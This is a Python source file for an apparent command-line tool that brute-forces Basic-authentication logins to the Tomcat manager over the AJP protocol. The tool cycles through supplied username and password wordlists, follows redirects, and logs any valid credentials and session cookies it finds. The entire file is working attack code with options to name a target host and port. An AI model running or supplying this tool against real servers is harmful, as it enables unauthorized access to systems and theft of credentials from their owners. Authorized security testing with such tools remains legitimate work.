from ajp import AjpResponse, AjpForwardRequest
from pprint import  pprint

import socket
import argparse

import logging
from colorlog import ColoredFormatter

def setup_logger():
    """Return a logger with a default ColoredFormatter."""
    formatter = ColoredFormatter(
        "[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        reset=True,
        log_colors={
            'DEBUG':    'bold_purple',
            'INFO':     'bold_green',
            'WARNING':  'bold_yellow',
            'ERROR':    'bold_red',
            'CRITICAL': 'bold_red',
        }
    )

    logger = logging.getLogger('meow')
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)

    return logger

logger = setup_logger()

# helpers
def prepare_ajp_forware_request(target_host, target_port, req_uri):
	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
	fr.method = AjpForwardRequest.GET
	fr.protocol = "HTTP/1.1"
	fr.req_uri = req_uri
	fr.remote_addr = target_host
	fr.remote_host = None
	fr.server_name = target_host
	fr.server_port = 80
	fr.request_headers = {
		'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'SC_REQ_CONNECTION': 'keep-alive',
		'SC_REQ_CONTENT_LENGTH': '0',
		'SC_REQ_HOST': target_host,
		'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'en-US,en;q=0.5',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0'
	}
	fr.is_ssl = False

	fr.attributes = []

	return fr

def receive_response(s):
	r = AjpResponse()
	r.parse(s)
	return r

class NotFoundException(Exception):
	pass

class TomcatBruteforcer(object):
	def __init__(self, target_host, target_port, users, passwords, req_uri, autostop):
		self.users = users
		self.passwords = passwords
		self.target_host = target_host
		self.target_port = target_port
		self.req_uri = req_uri
		self.autostop = autostop

		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.connect((target_host, target_port))
		self.stream = self.socket.makefile("rb", bufsize=0)

		self.forward_request = prepare_ajp_forware_request(target_host, target_port, req_uri)

	def test_password(self, user, password):
		res = False
		stop = False
		self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
		while not stop:
			logger.debug("testing %s:%s" % (user, password))
			self.socket.sendall(self.forward_request.serialize())
			r = receive_response(self.stream)
			assert r.prefix_code == AjpResponse.SEND_HEADERS
			if r.http_status_code == 404:
				raise NotFoundException("The req_uri %s does not exist!" % self.req_uri)
			elif r.http_status_code == 302:
				self.req_uri = r.response_headers.get('Location', '')
				logger.info("Redirecting to %s" % self.req_uri)
				self.forward_request.req_uri = self.req_uri
			elif r.http_status_code == 200:
				logger.info("Found valid credz: %s:%s" % (user, password))
				res = True
				stop = True
				if 'Set-Cookie' in r.response_headers:
					logger.info("Here is your cookie: %s" % (r.response_headers.get('Set-Cookie', '')))
			elif r.http_status_code == 401:
				stop = True

			# read body chunks and end response packets
			while True:
				r = receive_response(self.stream)
				if r.prefix_code == AjpResponse.END_RESPONSE:
					break
				elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
					continue
				else:
					logger.error("WTFError, unhandled prefix_code = %d" % r.prefix_code)
					break

		return res

	def start_bruteforce(self):
		logger.info("Attacking a tomcat at ajp13://%s:%d%s" % (self.target_host, self.target_port, self.req_uri))
 	 
		f_users = open(self.users, "r")
		f_passwords = open(self.passwords, "r")

		valid_credz = []
		try:
			for user in f_users:
				f_passwords.seek(0, 0)
				for password in f_passwords:
					if self.autostop and len(valid_credz) > 0:
						self.socket.close()
						return valid_credz

					user = user.rstrip('\n')
					password = password.rstrip('\n')
					if self.test_password(user, password):
						valid_credz.append((user, password))
		except NotFoundException as e:
			logger.fatal(e.message)
		finally:
			logger.debug("Closing socket...")
			self.socket.close()
			return valid_credz


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	subparsers = parser.add_subparsers()
	parser_bf = subparsers.add_parser('bf', help='Bruteforce Basic authentication')
	parser_bf.set_defaults(which='bf')

	parser_bf.add_argument("-t", "--target", type=str, help="Hostname or IP to attack", required=True)
	parser_bf.add_argument("-U", "--users", type=str, help="Filename containing the usernames to test against the Tomcat manager AJP", required=True)
	parser_bf.add_argument("-P", "--passwords", type=str, help="Filename containing the passwords to test against the Tomcat manager AJP", required=True)
	parser_bf.add_argument("-p", "--port", type=int, default=8009, help="AJP port to attack")
	parser_bf.add_argument("-r", "--req_uri", type=str, default="/manager/html", help="Resource to attack")
	parser_bf.add_argument('-v', '--verbose', action='count', default=1)
	parser_bf.add_argument('-s', '--stop', action='store_true', default=False, help="Stop when we find valid credz")

	args = parser.parse_args()

	if args.verbose == 1:
		logger.setLevel(logging.INFO)
	else:
		logger.setLevel(logging.DEBUG)

	if args.which == 'bf':
		bf = TomcatBruteforcer(args.target, args.port, args.users, args.passwords, args.req_uri, args.stop)
		bf.start_bruteforce()
